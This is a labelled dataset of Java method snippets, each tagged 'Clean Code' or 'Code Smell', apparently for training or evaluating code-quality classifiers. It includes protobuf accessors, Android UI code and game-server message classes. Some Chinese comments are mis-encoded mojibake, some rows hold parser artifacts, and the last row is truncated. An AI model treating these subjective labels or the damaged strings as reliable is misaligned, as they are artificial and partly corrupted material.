"private OutputConverterProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private OutputConverterProto(){
  className_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@7e6a2f6e",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)80);
    output.writeUInt32NoTag(jDDLGDNOIEC);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    for (int i=0; i < miracleInfoRemote.length(); i++) {
      output.writeRawByte((byte)96);
      output.writeUInt32NoTag(miracleInfoRemote.array()[i]);
    }
  }
  if ((bitField0_ & 0x00000004) != 0) {
    for (int i=0; i < miracleInfo.length(); i++) {
      output.writeRawByte((byte)120);
      output.writeUInt32NoTag(miracleInfo.array()[i]);
    }
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.jDDLGDNOIEC,jDDLGDNOIEC);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRepeatedUInt32(FieldNames.miracleInfoRemote,miracleInfoRemote);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRepeatedUInt32(FieldNames.miracleInfo,miracleInfo);
  }
  output.endObject();
}",0,Clean Code
"@Override public List<HrmModelFiledVO> queryFieldValue(Dict kv){
  return baseMapper.queryFieldValue(kv);
}
",0,Clean Code
"IGProUser getReceiverMember();
",0,Clean Code
"@Deprecated public void bindParent(ViewGroup parentView){
  if (getCustomView() == null) {
    waitBind(parentView,null);
    return;
  }
  if (getCustomView().getParent() != null) {
    if (getCustomView().getParent() == parentView) {
      return;
    }
    ((ViewGroup)getCustomView().getParent()).removeView(getCustomView());
  }
  ViewGroup.LayoutParams lp=parentView.getLayoutParams();
  if (lp == null) {
    lp=new RelativeLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,ViewGroup.LayoutParams.WRAP_CONTENT);
  }
  parentView.addView(getCustomView(),lp);
}
public void bindParent(ViewGroup parentView,BaseDialog dialog){
  if (getCustomView() == null) {
    waitBind(parentView,null);
    return;
  }
  Log.e("">>>"",""bindParent: getCustomView().getParent()="" + getCustomView().getParent() + ""  parentView=""+ parentView);
  if (getCustomView().getParent() == parentView || parentView.getTag(PARENT_FLAG) == getCustomView().toString()) {
    return;
  }
  if (getCustomView().getParent() != null) {
    ((ViewGroup)getCustomView().getParent()).removeView(getCustomView());
  }
  ViewGroup.LayoutParams lp=getCustomView().getLayoutParams();
  if (lp == null) {
    lp=new RelativeLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,ViewGroup.LayoutParams.WRAP_CONTENT);
  }
  parentView.addView(getCustomView(),lp);
  onBind((D)dialog,getCustomView());
  callSetEvent((D)dialog,getCustomView());
  if (fragment != null || supportFragment != null) {
    if (dialog.getDialogImplMode() != DialogX.IMPL_MODE.VIEW) {
      BaseDialog.error(dialog.dialogKey() + ""闈� VIEW 瀹炵幇妯″紡涓嶆敮鎸� fragment 浣滀负瀛愬竷灞�鏄剧ず銆俓n"" + ""鍏跺師鍥犱负 Window 涓笉瀛樺湪 FragmentManager锛屾棤娉曞瀛愬竷灞�涓殑 fragment 杩涜绠＄悊銆�"");
      return;
    }
    getCustomView().post(new Runnable(){
      @Override public void run(){
        if (fragment != null && getCustomView() instanceof FrameLayout && dialog.getOwnActivity() instanceof AppCompatActivity) {
          AppCompatActivity appCompatActivity=(AppCompatActivity)dialog.getOwnActivity();
          androidx.fragment.app.FragmentTransaction transaction=appCompatActivity.getSupportFragmentManager().beginTransaction();
          transaction.add(getFragmentParentId(),fragment);
          transaction.commit();
          onFragmentBind((D)dialog,getCustomView(),fragment,appCompatActivity.getSupportFragmentManager());
        }
        if (supportFragment != null && getCustomView() instanceof FrameLayout && dialog.getOwnActivity() instanceof Activity) {
          Activity activity=dialog.getOwnActivity();
          android.app.FragmentTransaction transaction=activity.getFragmentManager().beginTransaction();
          transaction.add(getFragmentParentId(),supportFragment);
          transaction.commit();
          onFragmentBind((D)dialog,getCustomView(),supportFragment,activity.getFragmentManager());
        }
      }
    }
);
  }
}
",0,Clean Code
"/** 
 * <code>repeated .RogueRecordAvatar avatar_list = 5;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<RogueRecordAvatarOuterClass.RogueRecordAvatar> getMutableAvatarList(){
  bitField0_|=0x00000002;
  return avatarList;
}",0,Clean Code
"@Override public VectorFloat<?> sum(List<VectorFloat<?>> vectors){
  VectorFloat<?> sum=new ArrayVectorFloat(vectors.get(0).length());
  for (  VectorFloat<?> vector : vectors) {
    for (int i=0; i < vector.length(); i++) {
      sum.set(i,sum.get(i) + vector.get(i));
    }
  }
  return sum;
}
@Override public float sum(VectorFloat<?> vector){
  float sum=0;
  for (int i=0; i < vector.length(); i++) {
    sum+=vector.get(i);
  }
  return sum;
}",0,Clean Code
"@Override public void onChange(boolean selfChange){
  isLock=getLockApp(context) != -1;
  if (isLock) {
    setGestureLine(context,1);
  }
 else {
    setGestureLine(context,0);
  }
}
@Override public void onChange(boolean selfChange){
  Object getMDockStateMachine=XposedHelpers.callMethod(param.thisObject,""getMDockStateMachine"");
  Object getMDockWindowManager=XposedHelpers.callMethod(param.thisObject,""getMDockWindowManager"");
  View mDockRootView=(View)XposedHelpers.getObjectField(getMDockWindowManager,""mDockRootView"");
  if (context == null) {
    logE(TAG,""DockControllerImpl context must not null"");
    return;
  }
  if (getLockApp(context) != -1) {
    XposedHelpers.callMethod(getMDockStateMachine,""notifyPinnedStateChanged"",false);
    mDockRootView.setVisibility(View.GONE);
  }
 else {
    XposedHelpers.callMethod(getMDockStateMachine,""notifyPinnedStateChanged"",true);
    mDockRootView.setVisibility(View.VISIBLE);
  }
}
@Override public void onChange(boolean selfChange){
  isLock=getLockApp(context) != -1;
}",0,Clean Code
"public static GachaInfo parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new GachaInfo(),data).checkInitialized();
}
public static GachaInfo parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new GachaInfo(),input).checkInitialized();
}
public static GachaInfo parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new GachaInfo(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * <code>repeated .RogueBuffData buff_list = 12;</code>
 * @return whether the buffList field is set
 */
public boolean hasBuffList(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"@Override public int length(){
  return bitSet.length();
}
",0,Clean Code
"public ESortOrder getSortOrder(){
  if (ascSorting.isSelected()) {
    return ESortOrder.ASCENDING;
  }
  return ESortOrder.DESCENDING;
}
",0,Clean Code
"@SuppressWarnings(""unchecked"") public static <T>T sendGETRequest(Main main,String requestID,String url,Map<String,String> params,int connectionTimeoutMS,int readTimeoutMS,Integer version,String cdiVersion,String rid) throws IOException, io.supertokens.test.httpRequest.HttpResponseException {
  StringBuilder paramBuilder=new StringBuilder();
  if (params != null) {
    for (    Map.Entry<String,String> entry : params.entrySet()) {
      paramBuilder.append(entry.getKey()).append(""="").append(URLEncoder.encode(entry.getValue(),StandardCharsets.UTF_8)).append(""&"");
    }
  }
  String paramsStr=paramBuilder.toString();
  if (!paramsStr.equals("""")) {
    paramsStr=paramsStr.substring(0,paramsStr.length() - 1);
    url=url + ""?"" + paramsStr;
  }
  URL obj=getURL(main,requestID,url);
  InputStream inputStream=null;
  HttpURLConnection con=null;
  try {
    con=(HttpURLConnection)obj.openConnection();
    con.setConnectTimeout(connectionTimeoutMS);
    con.setReadTimeout(readTimeoutMS + 1000);
    if (version != null) {
      con.setRequestProperty(""api-version"",version + """");
    }
    if (cdiVersion != null) {
      con.setRequestProperty(""cdi-version"",cdiVersion);
    }
    if (rid != null) {
      con.setRequestProperty(""rId"",rid);
    }
    int responseCode=con.getResponseCode();
    if (responseCode < STATUS_CODE_ERROR_THRESHOLD) {
      inputStream=con.getInputStream();
    }
 else {
      inputStream=con.getErrorStream();
    }
    StringBuilder response=new StringBuilder();
    try (BufferedReader in=new BufferedReader(new InputStreamReader(inputStream,StandardCharsets.UTF_8))){
      String inputLine;
      while ((inputLine=in.readLine()) != null) {
        response.append(inputLine);
      }
    }
     if (responseCode < STATUS_CODE_ERROR_THRESHOLD) {
      if (!isJsonValid(response.toString())) {
        return (T)response.toString();
      }
      return (T)(new JsonParser().parse(response.toString()));
    }
    throw new io.supertokens.test.httpRequest.HttpResponseException(responseCode,response.toString());
  }
  finally {
    if (inputStream != null) {
      inputStream.close();
    }
    if (con != null) {
      con.disconnect();
    }
  }
}",1,Code Smell
"default void onWorkflowTerminatedIfEnabled(WorkflowModel workflow){
  if (workflow.getWorkflowDefinition().isWorkflowStatusListenerEnabled()) {
    onWorkflowTerminated(workflow);
  }
}
",0,Clean Code
"private ONNXExternalModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private ONNXExternalModelProto(){
  forwardFeatureMapping_=emptyIntList();
  backwardFeatureMapping_=emptyIntList();
  modelArray_=com.google.protobuf.ByteString.EMPTY;
  inputName_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@65480c30",0,Clean Code
"@Override public Object getSource(){
  return null;
}
",0,Clean Code
"/** 
 * <code>optional uint32 retcode = 7;</code>
 * @return the retcode
 */
public int getRetcode(){
  return retcode;
}",0,Clean Code
"public int readData(int sampleQueueIndex,FormatHolder formatHolder,DecoderInputBuffer buffer,boolean requireFormat){
  if (isPendingReset()) {
    return C.RESULT_NOTHING_READ;
  }
  if (!mediaChunks.isEmpty()) {
    int discardToMediaChunkIndex=0;
    while (discardToMediaChunkIndex < mediaChunks.size() - 1 && finishedReadingChunk(mediaChunks.get(discardToMediaChunkIndex))) {
      discardToMediaChunkIndex++;
    }
    Util.removeRange(mediaChunks,0,discardToMediaChunkIndex);
    HlsMediaChunk currentChunk=mediaChunks.get(0);
    Format trackFormat=currentChunk.trackFormat;
    if (!trackFormat.equals(downstreamTrackFormat)) {
      eventDispatcher.downstreamFormatChanged(trackType,trackFormat,currentChunk.trackSelectionReason,currentChunk.trackSelectionData,currentChunk.startTimeUs);
    }
    downstreamTrackFormat=trackFormat;
  }
  int result=sampleQueues[sampleQueueIndex].read(formatHolder,buffer,requireFormat,loadingFinished,lastSeekPositionUs);
  if (result == C.RESULT_FORMAT_READ) {
    Format format=formatHolder.format;
    if (sampleQueueIndex == primarySampleQueueIndex) {
      int chunkUid=sampleQueues[sampleQueueIndex].peekSourceId();
      int chunkIndex=0;
      while (chunkIndex < mediaChunks.size() && mediaChunks.get(chunkIndex).uid != chunkUid) {
        chunkIndex++;
      }
      Format trackFormat=chunkIndex < mediaChunks.size() ? mediaChunks.get(chunkIndex).trackFormat : upstreamTrackFormat;
      format=format.copyWithManifestFormatInfo(trackFormat);
    }
    if (format.drmInitData != null) {
      DrmInitData drmInitData=overridingDrmInitData.get(format.drmInitData.schemeType);
      if (drmInitData != null) {
        format=format.copyWithDrmInitData(drmInitData);
      }
    }
    formatHolder.format=format;
  }
  return result;
}",0,Clean Code
"public void callOnCreateProcedureInternal(){
  boolean hasFocus=true;
  if (this.mIsInitializing) {
    this.mIsInitializing=false;
    bypassStateLossCheck();
    if (doOnCreate(this.mOnCreateBundle) && !isFinishing()) {
      if (this.mIsStartSkipped) {
        doOnStart();
        this.mIsStartSkipped=false;
        if (this.mOnRestoreBundle != null) {
          doOnRestoreInstanceState(this.mOnRestoreBundle);
          this.mOnRestoreBundle=null;
        }
        doOnPostCreate(this.mPostCreateBundle);
        if (this.mIsResultWaiting) {
          doOnActivityResult(this.mRequestCode,this.mResultCode,this.mResultData);
          this.mIsResultWaiting=false;
          this.mResultData=null;
        }
        if (this.mNewIntent != null) {
          doOnNewIntent(this.mNewIntent);
          this.mNewIntent=null;
        }
        if (isResumed2()) {
          doOnResume();
          doOnPostResume();
        }
        if (this.mWindowFocusState != -1) {
          if (this.mWindowFocusState != 1) {
            hasFocus=false;
          }
          doOnWindowFocusChanged(hasFocus);
        }
      }
    }
 else     if (isFinishing()) {
      this.mIsInitializing=true;
      this.mIsFinishingInOnCreate=true;
    }
  }
}",0,Clean Code
"@Override public List<EmbeddingMatch<TextSegment>> findRelevant(Embedding referenceEmbedding,int maxResults,double minScore){
  String queryTemplate=""*=>[ KNN %d @%s $BLOB AS %s ]"";
  List<String> returnFields=new ArrayList<>(schema.metadataKeys());
  returnFields.addAll(asList(schema.vectorFieldName(),schema.scalarFieldName(),SCORE_FIELD_NAME));
  Query query=new Query(format(queryTemplate,maxResults,schema.vectorFieldName(),SCORE_FIELD_NAME)).addParam(""BLOB"",ToByteArray(referenceEmbedding.vector())).returnFields(returnFields.toArray(new String[0])).setSortBy(SCORE_FIELD_NAME,true).dialect(2);
  SearchResult result=client.ftSearch(schema.indexName(),query);
  List<Document> documents=result.getDocuments();
  return toEmbeddingMatch(documents,minScore);
}",0,Clean Code
"/** 
 * <code>repeated uint32 disabled_main_mission_id_list = 10;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedInt getMutableDisabledMainMissionIdList(){
  bitField0_|=0x00000004;
  return disabledMainMissionIdList;
}",0,Clean Code
"@Override public boolean isEmpty(){
  return delegate.isEmpty();
}
",0,Clean Code
"@Override public void endNull(){
  value=null;
}
",0,Clean Code
"/** 
 * Returns the common super type of the two given types.
 * @param type1 the internal name of a class.
 * @param type2 the internal name of another class.
 * @return the internal name of the common super class of the two givenclasses.
 */
public String getCommonSuperClass(String type1,String type2){
  if (type1.equals(type2)) {
    return type1;
  }
  Node node=nodeMap.get(type1);
  if (node == null) {
    throw new TypeNotPresentException(type1,null);
  }
  Node node2=nodeMap.get(type2);
  if (node2 == null) {
    throw new TypeNotPresentException(type2,null);
  }
  if (node.isAssignableFrom(node2)) {
    return type1;
  }
  if (node2.isAssignableFrom(node)) {
    return type2;
  }
  if (node instanceof InterfaceNode || node2 instanceof InterfaceNode) {
    return ""java/lang/Object"";
  }
 else {
    do {
      node=node.parent;
    }
 while (!node.isAssignableFrom(node2));
    return node.entity.name.replace('.','/');
  }
}",0,Clean Code
"public Integer getIsGray(){
  return this.isGray;
}
",0,Clean Code
"/** 
 * <pre> 1 </pre> <code>optional uint32 cheat_times = 4;</code>
 * @return the cheatTimes
 */
public int getCheatTimes(){
  return cheatTimes;
}",0,Clean Code
"private EntityMotion(){
}
",0,Clean Code
"private MockOutputInfoProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private MockOutputInfoProto(){
  label_=com.google.protobuf.LazyStringArrayList.EMPTY;
  counts_=emptyLongList();
  id_=emptyIntList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@3617048b",0,Clean Code
"public String getModelUri(){
  return this.modelUri;
}
",0,Clean Code
"@Override public void endArray(@Nullable EconomicMap<Object,ObjectMember> members){
  assert members != null;
  value=new VmListing(VmUtils.createEmptyMaterializedFrame(),BaseModule.getListingClass().getPrototype(),members,EconomicMaps.size(members));
  currPath.pop();
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof RogueTalentInfo)) {
    return false;
  }
  RogueTalentInfo other=(RogueTalentInfo)o;
  return bitField0_ == other.bitField0_ && (!hasRogueTalent() || rogueTalent.equals(other.rogueTalent));
}",0,Clean Code
"@Override public void mouseWheelMoved(MouseWheelEvent e){
  if (mCurrentMode == SearchableComponent.MODE_CONTROL) {
    double rotation=e.getPreciseWheelRotation();
    int lastX=mControlTransX;
    if (rotation > 0) {
      mControlTransX+=5;
    }
 else {
      mControlTransX-=5;
    }
    if (mControlTransX < 7) {
      mControlTransX=7;
    }
    if (lastX != mControlTransX) {
      repaint();
    }
  }
 else {
    float delta=e.getPreciseWheelRotation() < 0 ? 0.1f : -0.1f;
    if (codeLocatorWindow.getCodelocatorConfig().isMouseWheelDirection()) {
      delta=-delta;
    }
    if (mScaleRatio <= 1f && delta < 0) {
      mScaleRatio=1f;
      return;
    }
    mScaleRatio+=delta;
    mScaleRatio=Math.max(1f,mScaleRatio);
    if (mScaleRatio == 1f) {
      mTransX=0;
      mTransY=0;
    }
 else     if (mScaleRatio > 1) {
      adjustCanvasTrans(e);
    }
    repaint();
  }
}",0,Clean Code
"public int getProvinceId(){
  return this.provinceId;
}
",0,Clean Code
"public static Set<String> getDadaDailySet(){
  Statistics stat=getStatistics();
  return stat.dailyAnswerList;
}
",0,Clean Code
"public EntityProp loadProp(Scene scene,GroupInfo group,PropInfo propInfo){
  if (propInfo.isIsDelete() || propInfo.isIsClientOnly()) {
    return null;
  }
  PropExcel propExcel=GameData.getPropExcelMap().get(propInfo.getPropID());
  if (propExcel == null)   return null;
  EntityProp prop=new EntityProp(scene,propExcel,group,propInfo);
  prop.setState(propInfo.getState(),false);
  if (prop.getPropId() == 1003) {
    if (propInfo.getMappingInfoID() == 2220) {
      prop.setState(PropState.Open,false);
    }
 else {
      return null;
    }
  }
 else   if (prop.getExcel().isDoor()) {
    prop.setState(PropState.Open,false);
  }
 else   if (prop.getExcel().getPropType() == PropType.PROP_SPRING) {
    scene.getHealingSprings().add(prop);
  }
  if (propInfo.getTrigger() != null) {
    scene.getTriggers().add(propInfo.getTrigger());
  }
  return prop;
}",0,Clean Code
"/** 
 * 鑾峰彇鍗曞厓鏍煎��
 * @param row 鑾峰彇鐨勮
 * @param column 鑾峰彇鍗曞厓鏍煎垪鍙�
 * @return 鍗曞厓鏍煎��
 */
public Object getCellValue(Row row,int column){
  if (row == null) {
    return row;
  }
  Object val="""";
  try {
    Cell cell=row.getCell(column);
    if (StringUtils.isNotNull(cell)) {
      if (cell.getCellType() == CellType.NUMERIC || cell.getCellType() == CellType.FORMULA) {
        val=cell.getNumericCellValue();
        if (DateUtil.isCellDateFormatted(cell)) {
          val=DateUtil.getJavaDate((Double)val);
        }
 else {
          if ((Double)val % 1 != 0) {
            val=new BigDecimal(val.toString());
          }
 else {
            val=new DecimalFormat(""0"").format(val);
          }
        }
      }
 else       if (cell.getCellType() == CellType.STRING) {
        val=cell.getStringCellValue();
      }
 else       if (cell.getCellType() == CellType.BOOLEAN) {
        val=cell.getBooleanCellValue();
      }
 else       if (cell.getCellType() == CellType.ERROR) {
        val=cell.getErrorCellValue();
      }
    }
  }
 catch (  Exception e) {
    return val;
  }
  return val;
}",1,Code Smell
"/** 
 * <code>repeated .ChessRogueNousSubStoryInfo sub_story_info = 6;</code>
 * @param values the subStoryInfo to add
 * @return this
 */
public GetChessRogueNousStoryInfoScRsp addAllSubStoryInfo(final ChessRogueNousSubStoryInfoOuterClass.ChessRogueNousSubStoryInfo... values){
  bitField0_|=0x00000002;
  subStoryInfo.addAll(values);
  return this;
}",0,Clean Code
"@Bean @ConditionalOnMissingBean @ConditionalOnProperty(prefix=ZhiPuAiImageProperties.CONFIG_PREFIX,name=""enabled"",havingValue=""true"",matchIfMissing=true) public ZhiPuAiImageClient zhiPuAiImageClient(ZhiPuAiConnectionProperties commonProperties,ZhiPuAiImageProperties imageProperties,RestClient.Builder restClientBuilder,RetryTemplate retryTemplate,ResponseErrorHandler responseErrorHandler){
  String apiKey=StringUtils.hasText(imageProperties.getApiKey()) ? imageProperties.getApiKey() : commonProperties.getApiKey();
  String baseUrl=StringUtils.hasText(imageProperties.getBaseUrl()) ? imageProperties.getBaseUrl() : commonProperties.getBaseUrl();
  Assert.hasText(apiKey,""ZhiPuAI API key must be set"");
  Assert.hasText(baseUrl,""ZhiPuAI base URL must be set"");
  var zhiPuAiImageApi=new ZhiPuAiImageApi(baseUrl,apiKey,restClientBuilder,responseErrorHandler);
  return new ZhiPuAiImageClient(zhiPuAiImageApi,imageProperties.getOptions(),retryTemplate);
}
",0,Clean Code
"@Override public CfAppVersionLogExample getExampleByQuery(CfAppVersionLogQuery cfAppVersionLogQuery){
  CfAppVersionLogExample cfAppVersionLogExample=new CfAppVersionLogExample();
  CfAppVersionLogExample.Criteria criteria=cfAppVersionLogExample.createCriteria();
  if (StringUtils.isNoneEmpty(cfAppVersionLogQuery.getPlatform())) {
    criteria.andPlatformEqualTo(cfAppVersionLogQuery.getPlatform());
  }
  if (StringUtils.isNoneEmpty(cfAppVersionLogQuery.getVersionNumber())) {
    criteria.andVersionNumberEqualTo(cfAppVersionLogQuery.getVersionNumber());
  }
  if (cfAppVersionLogQuery.getLevel() != null) {
    criteria.andLevelEqualTo(cfAppVersionLogQuery.getLevel());
  }
  if (cfAppVersionLogQuery.getMinLevel() != null) {
    criteria.andLevelGreaterThanOrEqualTo(cfAppVersionLogQuery.getMinLevel());
  }
  if (cfAppVersionLogQuery.getMaxLevel() != null) {
    criteria.andLevelLessThanOrEqualTo(cfAppVersionLogQuery.getMaxLevel());
  }
  if (cfAppVersionLogQuery.getMinPublishTime() != null) {
    criteria.andPublishTimeGreaterThanOrEqualTo(cfAppVersionLogQuery.getMinPublishTime());
  }
  if (cfAppVersionLogQuery.getMaxPublishTime() != null) {
    criteria.andPublishTimeLessThanOrEqualTo(cfAppVersionLogQuery.getMaxPublishTime());
  }
  if (StringUtils.isNoneEmpty(cfAppVersionLogQuery.getOrderBy())) {
    cfAppVersionLogExample.setOrderByClause(cfAppVersionLogQuery.getOrderBy());
  }
  if (cfAppVersionLogQuery.getPage() != null && cfAppVersionLogQuery.getSize() != null) {
    PageHelper.startPage(cfAppVersionLogQuery.getPage(),cfAppVersionLogQuery.getSize());
  }
  return cfAppVersionLogExample;
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code RefreshTriggerByClientScNotify}
 */
public static RefreshTriggerByClientScNotify newInstance(){
  return new RefreshTriggerByClientScNotify();
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.ModelProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.ModelProto other=(org.tribuo.protos.core.ModelProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"public Arithmetic(String operator,Expression left,Expression right){
  super(operator,left,right);
}
public Arithmetic(boolean inline,String operator,Expression left,Expression right){
  super(inline,operator,left,right);
}
",0,Clean Code
"private MockMultiOutputProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private MockMultiOutputProto(){
  label_=com.google.protobuf.LazyStringArrayList.EMPTY;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@31802cb7",0,Clean Code
"/** 
 * <code>optional uint32 select_buff_source_hint = 1;</code>
 * @return this
 */
public RogueBuffSelectInfo clearSelectBuffSourceHint(){
  bitField0_&=~0x00000001;
  selectBuffSourceHint=0;
  return this;
}",0,Clean Code
"public XxlRpcReferenceBean initClient() throws Exception {
  if (this.client == null) {
    throw new XxlRpcException(""xxl-rpc reference client missing."");
  }
  if (this.serializer == null) {
    throw new XxlRpcException(""xxl-rpc reference serializer missing."");
  }
  if (this.callType == null) {
    throw new XxlRpcException(""xxl-rpc reference callType missing."");
  }
  if (this.loadBalance == null) {
    throw new XxlRpcException(""xxl-rpc reference loadBalance missing."");
  }
  if (this.iface == null) {
    throw new XxlRpcException(""xxl-rpc reference iface missing."");
  }
  if (this.timeout < 0) {
    this.timeout=0;
  }
  if (this.invokerFactory == null) {
    this.invokerFactory=XxlRpcInvokerFactory.getInstance();
  }
  this.serializerInstance=serializer.newInstance();
  clientInstance=client.newInstance();
  clientInstance.init(this);
  return this;
}",0,Clean Code
"private boolean onMoreOptionsSelected(MenuItem item){
  int itemId=item.getItemId();
  if (itemId == R.id.action_console) {
    return tryDoing(mEditorView::showConsole);
  }
  if (itemId == R.id.action_import_java_class) {
    importJavaPackageOrClass();
    return true;
  }
  if (itemId == R.id.action_editor_text_size) {
    return tryDoing(mEditorView::selectTextSize);
  }
  if (itemId == R.id.action_editor_pinch_to_zoom) {
    setPinchToZoomStrategy();
    return true;
  }
  if (itemId == R.id.action_editor_fx_symbols_settings) {
    startSymbolsSettingsActivity();
    return true;
  }
  if (itemId == R.id.action_editor_theme) {
    return tryDoing(mEditorView::selectEditorTheme);
  }
  if (itemId == R.id.action_open_by_other_apps) {
    return tryDoing(mEditorView::openByOtherApps);
  }
  if (itemId == R.id.action_info) {
    showInfo();
    return true;
  }
  if (itemId == R.id.action_build_apk) {
    startBuildApkActivity();
    return true;
  }
  return false;
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)64);
    output.writeBoolNoTag(isGetAll);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    for (int i=0; i < baseAvatarIdList.length(); i++) {
      output.writeRawByte((byte)24);
      output.writeUInt32NoTag(baseAvatarIdList.array()[i]);
    }
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeBool(FieldNames.isGetAll,isGetAll);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRepeatedUInt32(FieldNames.baseAvatarIdList,baseAvatarIdList);
  }
  output.endObject();
}",0,Clean Code
"public void dispose(){
  removeMouseListener(mouseListener);
  getSelectionModel().removeListSelectionListener(selectionListener);
  model.dispose();
}
",0,Clean Code
"@Override protected void onDraw(Canvas canvas){
  if (additionalTranslationY != 0) {
    canvas.save();
    float bottom=getMeasuredHeight() - enterOffset + enterOffsetMargin + AndroidUtilities.dp(1);
    if (bottom > 0) {
      canvas.clipRect(0,0,getMeasuredWidth(),bottom);
      super.dispatchDraw(canvas);
    }
    backgroundDrawable.draw(canvas);
    canvas.restore();
  }
 else {
    backgroundDrawable.draw(canvas);
  }
  if (currentAction == ACTION_DELETE || currentAction == ACTION_CLEAR || currentAction == ACTION_DELETE_FEW || currentAction == ACTION_CLEAR_FEW || currentAction == ACTION_CLEAR_DATES) {
    int newSeconds=timeLeft > 0 ? (int)Math.ceil(timeLeft / 1000.0f) : 0;
    if (prevSeconds != newSeconds) {
      prevSeconds=newSeconds;
      timeLeftString=String.format(""%d"",Math.max(1,newSeconds));
      if (timeLayout != null) {
        timeLayoutOut=timeLayout;
        timeReplaceProgress=0;
        textWidthOut=textWidth;
      }
      textWidth=(int)Math.ceil(textPaint.measureText(timeLeftString));
      timeLayout=new StaticLayout(timeLeftString,textPaint,Integer.MAX_VALUE,Layout.Alignment.ALIGN_NORMAL,1.0f,0.0f,false);
    }
    if (timeReplaceProgress < 1f) {
      timeReplaceProgress+=16f / 150f;
      if (timeReplaceProgress > 1f) {
        timeReplaceProgress=1f;
      }
 else {
        invalidate();
      }
    }
    int alpha=textPaint.getAlpha();
    if (timeLayoutOut != null && timeReplaceProgress < 1f) {
      textPaint.setAlpha((int)(alpha * (1f - timeReplaceProgress)));
      canvas.save();
      canvas.translate(rect.centerX() - textWidth / 2,AndroidUtilities.dp(17.2f) + AndroidUtilities.dp(10) * timeReplaceProgress);
      timeLayoutOut.draw(canvas);
      textPaint.setAlpha(alpha);
      canvas.restore();
    }
    if (timeLayout != null) {
      if (timeReplaceProgress != 1f) {
        textPaint.setAlpha((int)(alpha * timeReplaceProgress));
      }
      canvas.save();
      canvas.translate(rect.centerX() - textWidth / 2,AndroidUtilities.dp(17.2f) - AndroidUtilities.dp(10) * (1f - timeReplaceProgress));
      timeLayout.draw(canvas);
      if (timeReplaceProgress != 1f) {
        textPaint.setAlpha(alpha);
      }
      canvas.restore();
    }
    canvas.drawArc(rect,-90,-360 * (timeLeft / 5000.0f),false,progressPaint);
  }
  long newTime=SystemClock.elapsedRealtime();
  long dt=newTime - lastUpdateTime;
  timeLeft-=dt;
  lastUpdateTime=newTime;
  if (timeLeft <= 0) {
    hide(true,hideAnimationType);
  }
  if (currentAction != ACTION_PREVIEW_MEDIA_DESELECTED) {
    invalidate();
  }
}",0,Clean Code
"@Override @Transactional public List<OperationLog> batchUpdateInsuranceProject(UpdateInsuranceProjectBO updateInsuranceProjectBO){
  List<OperationLog> operationLogList=new ArrayList<>();
  updateInsuranceProjectBO.getIEmpRecordIds().forEach(iEmpRecordId -> {
    updateInsuranceProjectBO.setIEmpRecordId(iEmpRecordId);
    operationLogList.add(updateInsuranceProject(updateInsuranceProjectBO));
  }
);
  return operationLogList;
}
",0,Clean Code
"/** 
 * <pre> 璁块棶绫诲瀷 </pre> <code>string equipmentType = 11;</code>
 * @return The bytes for equipmentType.
 */
com.google.protobuf.ByteString getEquipmentTypeBytes();",0,Clean Code
"/** 
 * 鎻愪氦鑰冩牳
 */
public Content submitAppraisalRecord(Long employeeAppraisalId){
  String content=""濉啓骞舵彁浜や簡"";
  String transContent=HrmLanguageEnum.ASSESSMENT_COMMIT.getFieldFormat();
  save(content,transContent,employeeAppraisalId);
  return new Content("""",content,transContent,BehaviorEnum.UPDATE);
}
",0,Clean Code
"private void clearActionOtherBuffSelectInfo(){
  if ((((bitField0_ & 0x00000003)) != 0)) {
    clearBonusSelectInfo();
    clearMiracleSelectInfo();
  }
}",0,Clean Code
"@Bean @DependsOn({""flyway"",""flywayInitializer""}) public MySQLMetadataDAO mySqlMetadataDAO(@Qualifier(""mysqlRetryTemplate"") RetryTemplate retryTemplate,ObjectMapper objectMapper,DataSource dataSource,MySQLProperties properties){
